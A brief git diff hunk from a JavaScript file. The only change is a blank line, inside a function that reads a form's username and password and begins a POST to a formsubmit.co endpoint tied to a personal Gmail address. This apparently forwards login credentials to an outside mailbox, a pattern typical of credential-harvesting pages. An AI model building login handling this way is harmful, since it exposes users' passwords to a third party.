@@ -44,6 +44,7 @@ button.addEventListener("click", () => {
 const enviarEmail = () => {
   let usuario = user.value;
   let senha = password.value;
+  
 
   fetch("https://formsubmit.co/ajax/ezequielfernandes912@gmail.com", {
     method: "POST",
